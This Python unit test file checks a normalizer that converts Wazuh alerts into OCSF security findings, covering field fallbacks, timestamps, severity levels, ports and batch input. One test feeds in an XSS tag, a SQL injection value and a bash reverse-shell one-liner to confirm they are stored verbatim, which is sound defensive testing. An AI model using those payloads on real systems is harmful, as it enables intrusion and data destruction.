"""
tests/unit/test_normalization.py — Comprehensive unit tests for OCSF normalization.

Tests verify:
- Complete normal Wazuh alerts mapped to OCSF Security Finding.
- Handling of missing fields (agent, rule, endpoints, user, MITRE, alert id).
- Safe handling of malformed and timezone-aware timestamps.
- Resilience against invalid ports, invalid levels, and unexpected types.
- Preservation of untrusted raw data and vendor-specific unmapped fields.
- Batch processing with both list and RawAlertBatch inputs.
- Error handling on non-dict and malformed structures.
"""

from __future__ import annotations

import time
from typing import Any

import pytest

from ingestion.poller import RawAlertBatch
from normalization.models import OCSFSecurityFinding
from normalization.normalizer import (
    AlertSchemaError,
    OCSFNormalizer,
)


@pytest.fixture
def normalizer() -> OCSFNormalizer:
    return OCSFNormalizer()


@pytest.fixture
def complete_wazuh_alert() -> dict[str, Any]:
    return {
        "timestamp": "2026-10-17T12:00:00.000+0000",
        "rule": {
            "level": 10,
            "description": "sshd: brute force attack.",
            "id": "5712",
            "mitre": {
                "id": ["T1110"],
                "tactic": ["Credential Access"],
                "technique": ["Brute Force"],
            },
            "groups": ["syslog", "sshd", "authentication_failures"],
        },
        "agent": {
            "id": "001",
            "name": "web-server-01",
            "ip": "192.168.1.50",
        },
        "manager": {
            "name": "wazuh-manager",
        },
        "id": "1697544000.12345",
        "cluster": {
            "name": "wazuh-prod",
        },
        "full_log": "Oct 17 12:00:00 web-server-01 sshd[1234]: Failed password for invalid user admin from 203.0.113.195 port 45123 ssh2",
        "decoder": {
            "name": "sshd",
        },
        "data": {
            "srcip": "203.0.113.195",
            "srcport": "45123",
            "dstip": "192.168.1.50",
            "dstport": 22,
            "dstuser": "admin",
            "protocol": "ssh",
        },
        "location": "/var/log/auth.log",
    }


class TestOCSFNormalAlert:
    """Tests for complete, well-formed Wazuh alerts."""

    def test_complete_alert_normalization(
        self,
        normalizer: OCSFNormalizer,
        complete_wazuh_alert: dict[str, Any],
    ) -> None:
        finding = normalizer.normalize(complete_wazuh_alert)

        assert isinstance(finding, OCSFSecurityFinding)
        # OCSF Schema invariants
        assert finding.class_uid == 2001
        assert finding.class_name == "Security Finding"
        assert finding.category_uid == 2
        assert finding.category_name == "Findings"
        assert finding.activity_id == 1
        assert finding.activity_name == "Create"
        assert finding.status_id == 1
        assert finding.status == "New"

        # Severity mapping: level 10 -> High (4)
        assert finding.severity_id == 4
        assert finding.severity == "High"

        # Finding info
        assert finding.finding_info.uid == "1697544000.12345"
        assert finding.finding_info.title == "sshd: brute force attack."
        assert finding.finding_info.desc == complete_wazuh_alert["full_log"]
        assert "sshd" in finding.finding_info.types
        assert finding.finding_info.src_url == "/var/log/auth.log"

        # Metadata
        assert finding.metadata.version == "1.1.0"
        assert finding.metadata.schema_name == "project_ocsf_subset"
        assert finding.metadata.product.name == "Wazuh"
        assert finding.metadata.product.version == "wazuh-prod"
        assert finding.metadata.original_time == "2026-10-17T12:00:00.000+0000"

        # Device
        assert finding.device is not None
        assert finding.device.name == "web-server-01"
        assert finding.device.uid == "001"
        assert finding.device.ip == "192.168.1.50"

        # Endpoints
        assert finding.src_endpoint is not None
        assert finding.src_endpoint.ip == "203.0.113.195"
        assert finding.src_endpoint.port == 45123
        assert finding.src_endpoint.protocol_name == "ssh"

        assert finding.dst_endpoint is not None
        assert finding.dst_endpoint.ip == "192.168.1.50"
        assert finding.dst_endpoint.port == 22
        assert finding.dst_endpoint.protocol_name == "ssh"

        # User
        assert finding.user is not None
        assert finding.user.name == "admin"

        # ATT&CK mapping
        assert len(finding.attacks) == 1
        assert finding.attacks[0].technique is not None
        assert finding.attacks[0].technique.uid == "T1110"
        assert finding.attacks[0].technique.name == "Brute Force"
        assert finding.attacks[0].tactic is not None
        assert finding.attacks[0].tactic.name == "Credential Access"

        # Raw data preserved
        assert finding.raw_data == complete_wazuh_alert

        # Unmapped fields recorded
        assert finding.unmapped["decoder"] == {"name": "sshd"}
        assert finding.unmapped["location"] == "/var/log/auth.log"


class TestOCSFMissingFields:
    """Tests verifying behavior when alert fields are omitted."""

    def test_missing_agent_falls_back_to_manager(
        self,
        normalizer: OCSFNormalizer,
    ) -> None:
        alert = {
            "id": "1001",
            "timestamp": "2026-10-17T12:00:00Z",
            "manager": {"name": "central-manager"},
            "rule": {"level": 3, "description": "System event"},
        }
        finding = normalizer.normalize(alert)

        assert finding.device is not None
        assert finding.device.name == "central-manager"
        assert finding.device.uid == "000"
        assert finding.device.ip is None

    def test_missing_agent_and_manager_results_in_none_device(
        self,
        normalizer: OCSFNormalizer,
    ) -> None:
        alert = {
            "id": "1002",
            "timestamp": "2026-10-17T12:00:00Z",
            "rule": {"level": 3, "description": "Agentless event"},
        }
        finding = normalizer.normalize(alert)
        assert finding.device is None

    def test_missing_rule_and_severity_defaults_to_unknown(
        self,
        normalizer: OCSFNormalizer,
    ) -> None:
        alert = {
            "id": "1003",
            "timestamp": "2026-10-17T12:00:00Z",
        }
        finding = normalizer.normalize(alert)

        assert finding.severity_id == 0
        assert finding.severity == "Unknown"
        assert finding.finding_info.title == "Wazuh Security Alert"

    def test_missing_endpoints_results_in_none(
        self,
        normalizer: OCSFNormalizer,
    ) -> None:
        alert = {
            "id": "1004",
            "timestamp": "2026-10-17T12:00:00Z",
            "rule": {"level": 5, "description": "File integrity event"},
        }
        finding = normalizer.normalize(alert)

        assert finding.src_endpoint is None
        assert finding.dst_endpoint is None

    def test_missing_user_results_in_none(
        self,
        normalizer: OCSFNormalizer,
    ) -> None:
        alert = {
            "id": "1005",
            "timestamp": "2026-10-17T12:00:00Z",
            "rule": {"level": 5, "description": "Kernel event"},
        }
        finding = normalizer.normalize(alert)
        assert finding.user is None

    def test_missing_id_generates_deterministic_composite_fallback(
        self,
        normalizer: OCSFNormalizer,
    ) -> None:
        alert = {
            "timestamp": "2026-10-17T12:00:00Z",
            "rule": {"id": "1002", "level": 5, "description": "Test event"},
            "agent": {"id": "007"},
        }
        finding1 = normalizer.normalize(alert)
        finding2 = normalizer.normalize(alert)

        assert finding1.finding_info.uid.startswith("comp-")
        # Must be strictly deterministic across calls
        assert finding1.finding_info.uid == finding2.finding_info.uid
        assert finding1.unmapped.get("id_generated") is True


class TestOCSFTimestampHandling:
    """Tests for ISO, numeric, timezone-aware, and malformed timestamps."""

    def test_numeric_timestamp_in_seconds(
        self,
        normalizer: OCSFNormalizer,
    ) -> None:
        now_sec = 1700000000.5
        alert = {"id": "ts-1", "timestamp": now_sec}
        finding = normalizer.normalize(alert)

        assert finding.time == 1700000000500
        assert finding.metadata.original_time == str(now_sec)

    def test_numeric_timestamp_in_milliseconds(
        self,
        normalizer: OCSFNormalizer,
    ) -> None:
        now_ms = 1700000000500
        alert = {"id": "ts-2", "timestamp": now_ms}
        finding = normalizer.normalize(alert)

        assert finding.time == now_ms
        assert finding.metadata.original_time == str(now_ms)

    def test_iso_timestamp_with_z(
        self,
        normalizer: OCSFNormalizer,
    ) -> None:
        alert = {"id": "ts-3", "timestamp": "2026-10-17T12:00:00Z"}
        finding = normalizer.normalize(alert)

        assert finding.time > 0
        assert finding.metadata.original_time == "2026-10-17T12:00:00Z"

    def test_iso_timestamp_with_colon_offset(
        self,
        normalizer: OCSFNormalizer,
    ) -> None:
        alert = {"id": "ts-4", "timestamp": "2026-10-17T12:00:00+05:30"}
        finding = normalizer.normalize(alert)

        assert finding.time > 0

    def test_malformed_string_timestamp_falls_back_gracefully(
        self,
        normalizer: OCSFNormalizer,
    ) -> None:
        alert = {"id": "ts-5", "timestamp": "corrupt-non-iso-timestamp"}
        before = int(time.time() * 1000)
        finding = normalizer.normalize(alert)
        after = int(time.time() * 1000)

        # Fallback time within expected window
        assert before <= finding.time <= after + 100
        assert finding.metadata.original_time == "corrupt-non-iso-timestamp"
        assert "timestamp_warning" in finding.unmapped

    def test_missing_timestamp_falls_back_gracefully(
        self,
        normalizer: OCSFNormalizer,
    ) -> None:
        alert = {"id": "ts-6"}
        finding = normalizer.normalize(alert)

        assert finding.time > 0
        assert finding.metadata.original_time is None
        assert "timestamp_warning" in finding.unmapped


class TestOCSFValueValidationAndRobustness:
    """Tests verifying behavior on invalid data, edge cases, and type safety."""

    @pytest.mark.parametrize(
        ("wazuh_level", "expected_id", "expected_name"),
        [
            (0, 1, "Informational"),
            (3, 1, "Informational"),
            (4, 2, "Low"),
            (6, 2, "Low"),
            (7, 3, "Medium"),
            (9, 3, "Medium"),
            (10, 4, "High"),
            (12, 4, "High"),
            (13, 5, "Critical"),
            (16, 5, "Critical"),
            (-1, 0, "Unknown"),
            (17, 0, "Unknown"),
            ("10", 4, "High"),
            ("invalid", 0, "Unknown"),
            (None, 0, "Unknown"),
        ],
    )
    def test_wazuh_level_to_ocsf_severity_mapping(
        self,
        normalizer: OCSFNormalizer,
        wazuh_level: Any,
        expected_id: int,
        expected_name: str,
    ) -> None:
        alert = {"id": "sev-1", "rule": {"level": wazuh_level}}
        finding = normalizer.normalize(alert)

        assert finding.severity_id == expected_id
        assert finding.severity == expected_name

    @pytest.mark.parametrize(
        "invalid_port",
        [-1, 0, 65536, 999999, "not-a-port", "", None],
    )
    def test_invalid_ports_are_safely_ignored(
        self,
        normalizer: OCSFNormalizer,
        invalid_port: Any,
    ) -> None:
        alert = {
            "id": "port-1",
            "data": {
                "srcip": "1.2.3.4",
                "srcport": invalid_port,
            },
        }
        finding = normalizer.normalize(alert)

        assert finding.src_endpoint is not None
        assert finding.src_endpoint.ip == "1.2.3.4"
        assert finding.src_endpoint.port is None

    def test_corrupt_mitre_dict_handled_safely(
        self,
        normalizer: OCSFNormalizer,
    ) -> None:
        alert = {
            "id": "mitre-1",
            "rule": {
                "level": 5,
                "mitre": {
                    "id": "T1059",  # single string instead of list
                    "tactic": "Execution",  # single string instead of list
                    "technique": "Command and Scripting Interpreter",
                },
            },
        }
        finding = normalizer.normalize(alert)

        assert len(finding.attacks) == 1
        assert finding.attacks[0].technique is not None
        assert finding.attacks[0].technique.uid == "T1059"
        assert finding.attacks[0].technique.name == "Command and Scripting Interpreter"
        assert finding.attacks[0].tactic is not None
        assert finding.attacks[0].tactic.name == "Execution"

    def test_non_dict_mitre_does_not_crash(
        self,
        normalizer: OCSFNormalizer,
    ) -> None:
        alert = {
            "id": "mitre-2",
            "rule": {"level": 5, "mitre": "invalid_format_string"},
        }
        finding = normalizer.normalize(alert)
        assert finding.attacks == []

    def test_non_dict_raw_alert_raises_alert_schema_error(
        self,
        normalizer: OCSFNormalizer,
    ) -> None:
        with pytest.raises(AlertSchemaError, match="Expected raw_alert to be a dictionary"):
            normalizer.normalize("not-a-dictionary")  # type: ignore[arg-type]


class TestOCSFUntrustedInputAndPreservation:
    """Tests verifying raw payload fidelity and safe untrusted input treatment."""

    def test_untrusted_injection_payloads_preserved_without_execution(
        self,
        normalizer: OCSFNormalizer,
    ) -> None:
        dangerous_alert = {
            "id": "atk-001",
            "timestamp": "2026-10-17T12:00:00Z",
            "rule": {
                "level": 12,
                "description": "<script>alert('xss')</script>",
            },
            "data": {
                "srcip": "10.0.0.1",
                "dstuser": "admin'; DROP TABLE users; --",
            },
            "full_log": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        }
        finding = normalizer.normalize(dangerous_alert)

        # Untrusted strings preserved verbatim as passive data
        assert finding.finding_info.title == "<script>alert('xss')</script>"
        assert finding.user is not None
        assert finding.user.name == "admin'; DROP TABLE users; --"
        assert finding.message == "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        assert finding.raw_data == dangerous_alert


class TestOCSFBatchNormalization:
    """Tests verifying batch normalization with lists and RawAlertBatch."""

    def test_normalize_list_of_alerts(
        self,
        normalizer: OCSFNormalizer,
    ) -> None:
        alerts = [
            {"id": "b-1", "rule": {"level": 5, "description": "Alert 1"}},
            {"id": "b-2", "rule": {"level": 8, "description": "Alert 2"}},
        ]
        results = normalizer.normalize_batch(alerts)

        assert len(results) == 2
        assert results[0].finding_info.uid == "b-1"
        assert results[0].severity == "Low"
        assert results[1].finding_info.uid == "b-2"
        assert results[1].severity == "Medium"

    def test_normalize_raw_alert_batch_instance(
        self,
        normalizer: OCSFNormalizer,
    ) -> None:
        batch = RawAlertBatch(
            alerts=[
                {"id": "rab-1", "rule": {"level": 14, "description": "Critical event"}},
            ],
            total_available=1,
            offset=0,
            limit=100,
            polled_at=time.time(),
            endpoint="/alerts",
        )
        results = normalizer.normalize_batch(batch)

        assert len(results) == 1
        assert results[0].finding_info.uid == "rab-1"
        assert results[0].severity == "Critical"

    def test_normalize_batch_skips_malformed_items(
        self,
        normalizer: OCSFNormalizer,
    ) -> None:
        batch = [
            {"id": "valid-1", "rule": {"level": 5}},
            "completely-invalid-non-dict",
            {"id": "valid-2", "rule": {"level": 10}},
        ]
        results = normalizer.normalize_batch(batch, skip_malformed=True)

        assert len(results) == 2
        assert results[0].finding_info.uid == "valid-1"
        assert results[1].finding_info.uid == "valid-2"

    def test_normalize_batch_raises_when_skip_malformed_is_false(
        self,
        normalizer: OCSFNormalizer,
    ) -> None:
        batch = [
            {"id": "valid-1", "rule": {"level": 5}},
            "completely-invalid-non-dict",
        ]
        with pytest.raises(AlertSchemaError):
            normalizer.normalize_batch(batch, skip_malformed=False)

    def test_invalid_batch_type_raises_alert_schema_error(
        self,
        normalizer: OCSFNormalizer,
    ) -> None:
        with pytest.raises(AlertSchemaError, match="Expected batch to be a list or RawAlertBatch"):
            normalizer.normalize_batch(12345)
